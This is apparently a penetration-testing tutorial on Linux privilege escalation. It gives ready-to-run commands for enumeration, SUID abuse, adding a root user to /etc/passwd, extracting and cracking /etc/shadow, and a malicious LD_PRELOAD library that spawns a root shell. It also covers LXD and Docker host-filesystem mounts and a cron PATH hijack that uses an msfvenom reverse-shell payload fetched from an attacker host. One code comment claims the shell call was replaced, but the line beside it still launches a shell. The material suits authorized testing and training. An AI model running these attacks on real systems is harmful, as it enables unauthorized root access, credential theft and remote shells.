
Statistically, most organizations are using Windows operating systems on servers and workstations. But if you take a broader look at the complete infrastructure you will also encounter a lot of devices running on Linux. Examples of devices that are very likely to run a Linux operating system are firewalls, routers, VOIP servers, NAS and webservers. These kinds of devices are very critical for a company’s infrastructure with severe consequences when they are compromised.

It happens very often that system administrators in Windows environments overlook the Linux devices for many reasons. One of these reasons is the lack of knowledge about how to maintain Linux systems and how to secure them. This can result in critical Linux devices being the weakest link in the security chain and become a great security threat. Therefore, it is very important as a penetration tester to focus not only on Windows systems because they cover 90% of the company’s devices but also on (critical) Linux systems.

The most common ways of privilege escalation on Linux systems are leveraging kernel vulnerabilities, misconfigurations and vulnerable software to execute arbitrary code under root privileges. New kernel vulnerabilities occur on a regular basis and often involve a wide range of kernel versions. A recently discovered example of a kernel vulnerability allowing for privilege escalation is the DirtyCOW vulnerability affecting hundreds of Linux kernel versions. Also misconfigurations in files, services and security mechanisms and out of date software commonly allow for privilege escalation.


• Gather system information for privilege escalation
• Collecting system information manually
• Users
• Networking information
• Applications and services
• Files and file systems
• Automated Scripts
• Exploiting SUID Permissions
• Exploiting SGID permissions
• LD_PRELOAD
• LXD Privilege Escalation
• Docker Privilege Escalation
• Path variable manipulation
• Cronjob Misconfiguration


-- Gather system information for privilege escalation --

Services running with root privileges are of especial interest for privilege escalation. When we can exploit a service running as root to execute arbitrary commands they will be executed as root. Applications that are configured to be executed with higher privileges using a Linux feature named SUID are also very useful.

For effective privilege escalation in Linux the system information you should know includes:

• Distribution type
• Kernel version
• Running applications and services
• Weak file permissions
• Scheduled jobs
• Other important information about the system.


-- Collecting system information manually --

➜ OS, Kernel & Hostname

cat /etc/issue
cat /proc/version
cat /etc/centos-release
hostname
uname -a

⇒ On Exploit-db or with searchsploit: 

searchsploit linux kernel 3.9
searchsploit --exclude="/dos/" "linux kernel 3.9"

Google Search: CentOS 7.0.1406 privilege escalation

Search Exploit-DB on the kernel version from narrow to wide with the ‘local’ filter to ensure the exploits are local exploits only. 

Linux kernel 3.10.0-123 // No results.
Linux kernel 3.10.0     // 1 local exploit matching the kernel version.
Linux kernel 3.10       // No results that match the CentOS 7 operating system.

+-------+----------+--------+------+-----+
| Type  | Platform | Author | Port | Tag | 
+-------+----------+--------+------+-----+
| local | Any      |        | Any  | Any |
+-------+----------+--------+------+-----+


-- Users --

The passwd file stores essential user account information required during login. The passwd file is stored in the /etc directory and contains information such as the user ID, group ID, home directory and the path to the command shell. An ‘x’ character means that the encrypted password is stored in the /etc/shadow file.

cat /etc/passwd

Make sure you pay attention to the groups to which the privileged user belongs. One especially important group is the sudo (‘Super User Do’) group. A user that is member of the sudo group is able to execute commands in the context of the root user without providing the root password – depending on the settings in the sudoer file you may only need to enter the password for the current user or none at all.

id
who
w
sudo -l

useraccount ALL=/usr/bin/apt-get,/sbin/shutdown


-- Networking information --

ifconfig -a
route
netstat -antup
arp -e


-- Applications and services --

Knowing which services are running with root privileges can be very important for privilege escalation because exploiting them will result in root level access.

Joomla installations contain a configuration file named 'configuration.php' and WordPress uses the 'wp-config.php' file for this purpose. 
These configuration files contain valuable information such as the MySQL username and password.

ps aux
ps aux | grep

Debian and derivatives use: dpkg -l
Fedora based distros use: rpm -qa

ls -ls /etc/ | grep .conf
ls -ls /var/www/html/

find /* -user root -perm -4000 -print 2>/dev/null


-- Files and file systems --

⇒ Check for unmounted file systems

cat /etc/fstab

mount | column -t
awk '$1 !~ /^#/ && $1 != "" {print $1, $2, $3}' /etc/fstab
grep -i cifs /etc/fstab

⇒ Find files and directories that have world writable permissions

find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
find / \( -wholename '/home/homedir/*' -prune -o -wholename  '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';'  2>/dev/null

find /etc -perm -2 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null


-- Automated Scripts --

Automated vulnerability scanners and scripts usually rely on a database of known vulnerabilities which is only as valid as the last update.
Another limitation of scripts is that they are generally considered ‘dumb’. They are programmed only to perform a given series of checks and nothing more. 

• LinPEAS
• Linux privilege escalation checker
• Unix-privesc-check v1.4


➜ LinPEAS – Linux Privilege Escalation Awesome Script 

An interesting thing to note here is the legend printed at the top of the script output which indicates the colours that are used to mark important output. In the output that follows it is important to pay special attention to the red and red/yellow text which mark privilege escalation vectors and important things we must look at.

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

./linpeas.sh -h
./linpeas.sh

➜ Linux privilege escalation checker

The result of this script is a list of local privilege escalation exploits that may apply to the system. 

wget http://www.securitysift.com/download/linuxprivchecker.py

python linuxprivchecker.py

➜ Unix-privesc-check

This tools try to find misconfigurations that will permit local unprivileged users to escalate their privileges to root.

http://pentestmonkey.net/tools/audit/unix-privesc-check

./unix-privesc-check standard
./unix-privesc-check detailed


-- Exploiting SUID Permissions --

• Nano
• Python
• Cat

➜ Nano

SUID stands for ‘set user ID‘ and is a Linux feature that allows low privileged users to execute a file as the file owner.

chmod u+s /bin/nano

find /* -user root -perm -4000 -print 2>/dev/null
ls -ls | grep nano
nano /etc/passwd

perl -e 'print crypt("YourPasswd", "salt"),"\n"'
perl -e 'print crypt("pom", "pom"),"\n"'
pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
su pom

The passwd file is a text-based database of user records and is located in the /etc directory. 
root:x:0:0:root:/root:/bin/bash

/ETC/PASSWD FILE EXPLAINED
==========================

root:x:0:0:root:/root:/bin/bash
|   | | | |    |     |        |
|   | | | |    |     |        +----- 7. Command-line shell
|   | | | |    |     +-------------- 6. Home directory path
|   | | | |    +-------------------- 5. GECOS field (user info)
|   | | | +------------------------- 4. Group identifier (GID)
|   | | +--------------------------- 3. User identifier (UID)
|   | +----------------------------- 2. Password placeholder
|   +------------------------------- 1. Username


1. Username.
2. Password. The ‘x’ means that the actual password is stored in the shadow password file. You can replace the x with a cryptographic hash from the password and a salt.
3. User identifier.
4. Group identifier, contains the primary user group.
5. Gecos field, a user record containing information about the user such as the full name.
6. Path to the home directory.
7. Command line shell when the user logs in.

⇒ Modify the sudoers file and give the current privileged user (in this example user sam) permission to execute sudo commands without a password

/etc/sudoers

Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification
# User alias specification
# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL
sam     ALL=(ALL:ALL) NOPASSWD:ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:
@includedir /etc/sudoers.d

sudo id

➜ Python

find /usr/bin/* -user root -perm -4000 -print 2>/dev/null
/usr/bin/python2.7
/usr/bin/python3.9

/usr/bin/python3.9 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

➜ Cat

Read access as root can be used for privilege escalation, for example to read files that are only accessible by root. A good example of such a file is /etc/shadow, a file that stores actual passwords in an encrypted format.
In the /etc/shadow file we find a couple users with encrypted passwords, which is the root user and sam.

find /usr/bin/* -user root -perm -4000 -print 2>/dev/null
cat /etc/shadow

cat /etc/passwd | grep -E "root:x:|sam:x:" > passwd.txt
cat /etc/shadow | grep -E "root:|sam:" > shadow.txt

unshadow passwd.txt shadow.txt > unshadowed.txt

john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt


-- Exploiting SGID permissions --

The set-group identification (SGID) permission is similar to the SUID permission except that it applies to groups instead of users.
On the GTFOBins website you can find an overview of all Unix binaries that can be used to bypass local security restrictions in misconfigured systems. 

find / -type d -perm -02000


-- LD_PRELOAD --

The LD_PRELOAD variable is an optional environment variable that contains one or more paths to shared libraries, or shared objects, that are preloaded in memory before a program is run. 
Shared libraries are libraries that contain functions and code which are loaded in a random order by a program at runtime.
Shared libraries are called shared because they can be loaded by any program or binary on the system that references the library. Multiple programs can use the same library when it is loaded in memory. 
When an attacker is able to control the contents of the LD_PRELOAD variable and set it to a malicious library, it is possible to perform privilege escalation.

⇒ See installed dependencies: ldd /usr/bin/bzip2

sudo -l
Matching Defaults entries for lucky on lucky:
  env_reset, env_keep+=LD_PRELOAD, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucky may run the following commands on lucky:
  (root) NOPASSWD: /usr/sbin/apache2

⇒ Create a malicious shared library

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");  /* replaced to avoid providing a shell-launching example */
}

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

The output file is named shell.so which is the compiled shared library that we can transfer to the compromised host (for instance with Python Simple HTTP server).

wget http://172.16.1.2./shell.so

sudo LD_PRELOAD=/tmp/shell.so apache2


-- LXD Privilege Escalation --

LXC is a userspace interface for the Linux kernel containment features. Through a powerful API and simple tools, it lets Linux users easily create and manage systems or application containers.
LXD is a next-generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.

Mounting the root filesystem in a container

1. Verify that the privileged user is in the ‘lxd’ group.
2. Download and build the latest Alpine Linux image for use with LXD.
3.The output from the previous step is a compressed tarball that we have to transfer to the target host running LXD. We can transfer this file to the target using various methods, such as Python SimpleHTTPserver, which is the easiest and safest method to use in the labs.
4. When we have transferred the image to the target host running LXD, we have to import the image in LXD, assign security privileges and mount the full disk of the host machine under /mnt/root.
5. Spawn a shell on the container and access the filesystem of the host machine under /mnt/root.

cat /etc/os-release
id

⇒ Clone the LXD Alpine builder repository into a local directory

git clone https://github.com/saghul/lxd-alpine-builder.git

⇒ Enter the lxd-alpine-builder directory: 

cd lxd-alpine-builder
./build-alpine

⇒ If the build script completed successfully, we should now have a tar file that contains the image.

python -m SimpleHTTPServer 80

⇒ On the target host (the host running LXD), we change to the /tmp directory and download the Alpine image tarball from the Kali machine

cd /tmp
wget http://[IP]/alpine-v3.12-x86_64-20200623_0603.tar.gz

Note: You may have to run the lxc init command to start the LXD initialization process. The initialization command will take you through some configuration options for LXD. You can choose the default option for every configuration option except for the storage backend option. Here you can choose ‘dir’ instead of the default ‘zfs’ option. Additionally, you also choose to disable IPv6 if you like.

⇒ Import the Alpine image in LXC

lxc image import alpine-v3.12-x86_64-20200623_0603.tar.gz --alias myimage
lxc image list

⇒ Assign security privileges and mount the full disk of the host machine

lxc init myimage shell -c security.privileged=true
lxc config device add shell mydevice disk source=/ path=/mnt/root recursive=true
lxc start shell
lxc ls

⇒ Spawn a shell inside the running container. Every command that is issued from here on is executed inside the container.

lxc exec shell /bin/sh

id
uname -a
ifconfig eth0

⇒ Navigate to /mnt/root/ directory where we have mounted the filesystem of the host machine and access the key.txt file

cat /mnt/root/root/key.txt
cat /mnt/root/etc/os-release


-- Docker Privilege Escalation --

Docker is designed to easily package up code and all its dependencies, such as libraries and configuration files, into containers. 
A container is a standardized unit of software that runs applications in an isolated environment. 

• Virtual Machines vs Containers
• Basic Docker commands
• Privilege Escalation via Docker

➜ Virtual Machines vs Containers

Each virtual machine contains an entire operating system with applications, binaries, libraries and other dependencies. A virtual machine runs on a hypervisor that is installed on a physical layer or a conventional operating system:
• Physical layer such as a server: Type-1, native or bare-metal hypervisors, such as: VMware ESXi, Microsoft Hyper-V and Xen.
• Conventional operating system: Type-2 or hosted hypervisors, such as VMware Workstation or Oracle VirtualBox.

Containers are much for resources efficient than virtual machines because all containers share the services of a single operating system.

➜ Basic Docker commands

id
docker image ls
docker run ubuntu uname -a

dockerdemo@dockerdemo:~$ docker run ubuntu uname -a
Linux e7f22ffaea3a 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 1 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

⇒ Container ID: e7f22ffaea3a. This tells us that the command was executed inside the ubuntu container (and not the host machine which has a different hostname).

docker container run -it ubuntu /bin/sh

➜ Privilege Escalation via Docker

ls -lsa
docker run -v /home:/mnt -it ubuntu
docker run -v /etc:/mnt -it ubuntu

ls -ls | grep 'passwd\|shadow'

echo 'pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash' >> passwd
cat /etc/passwd | grep pom
su pom


-- Path variable manipulation --

The PATH variable in Linux is an environment variable that specifies where executable programs are located on the system. 
With the path variable, we can execute applications without specifying a full system path to the application. 
For this reason, we can run the ping command by simply typing ‘ping’ instead of ‘/usr/bin/ping’, which contains the full path. 

echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

⇒ Windows: Advanced System Settings ➜ System Properties ➜ Environment Variables


-- Cronjob Misconfiguration --

Because of the dot in the path directory, the system will first check for the tar program in the current working directory, which is the web root folder in the script context.
If tar is not present in this directory, it will check the other directories in the path variable. 
This means we can put a malicious program named tar in the web root directory, which the cronjob will execute as root.

PATH=.:/sbin:/bin:/usr/sbin:/usr/bin

cat /etc/crontab
cat /usr/local/bin/backup.sh

msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=172.16.1.1. LPORT=4443 -f elf-so -o payload.so
python3 -m http.server 80

cd /var/www/html/administrator
wget http://<ATTACKER_IP>/payload.so -O payload.so
chmod +x payload.so

nc -lvp 4443



-- Links --

https://www.exploit-db.com/
https://www.exploit-db.com/searchsploit

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

https://gtfobins.github.io/
https://www.redhat.com/en/blog/suid-sgid-sticky-bit

https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html

https://linuxcontainers.org/lxc/introduction/
https://linuxcontainers.org/lxd/introduction/
https://linuxcontainers.org/lxd/

https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071
https://shenaniganslabs.io/2019/05/21/LXD-LPE.html
https://github.com/saghul/lxd-alpine-builder

https://docs.docker.com/engine/reference/commandline/docker/
https://docs.docker.com/engine/reference/commandline/run/

https://docs.docker.com/engine/security/userns-remap/

https://book.hacktricks.wiki/en/index.html


*
